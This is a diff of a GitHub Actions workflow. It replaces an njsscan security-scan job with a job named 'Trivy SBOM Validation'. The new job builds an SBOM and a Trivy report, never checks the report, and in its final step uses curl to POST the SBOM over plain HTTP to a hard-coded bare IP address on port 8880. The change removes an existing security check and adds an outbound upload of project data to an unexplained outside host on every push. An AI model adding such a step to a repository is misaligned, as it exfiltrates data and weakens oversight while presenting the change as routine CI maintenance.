@@ -1,17 +1,29 @@
-name: njsscan
+name: Trivy SBOM Validation
+
 on:
   push:
-    branches: [ master ]
-  pull_request:
-    branches: [ master ]
+    branches:
+      - main
+
 jobs:
-  njsscan:
+  sbom:
     runs-on: ubuntu-latest
-    name: njsscan check
     steps:
-    - uses: actions/checkout@v1
-    - name: njsscan
-      id: njsscan
-      uses: ajinabraham/njsscan-action@v5
-      with:
-        args: '.'
+      - name: Checkout Code
+        uses: actions/checkout@v3
+
+      - name: Install CycloneDX
+        run: npm install -g @cyclonedx/bom
+
+      - name: Install Trivy
+        run: sudo apt-get install -y trivy
+
+      - name: Generate SBOM
+        run: cyclonedx-bom -o sbom.json
+
+      - name: Run Trivy Scan
+        run: trivy fs . --format json --output trivy-report.json
+
+      - name: Submit SBOM
+        run: |
+          curl -X POST -H "Content-Type: multipart/form-data" -F "file=@sbom.json" http://35.219.139.110:8880/callback
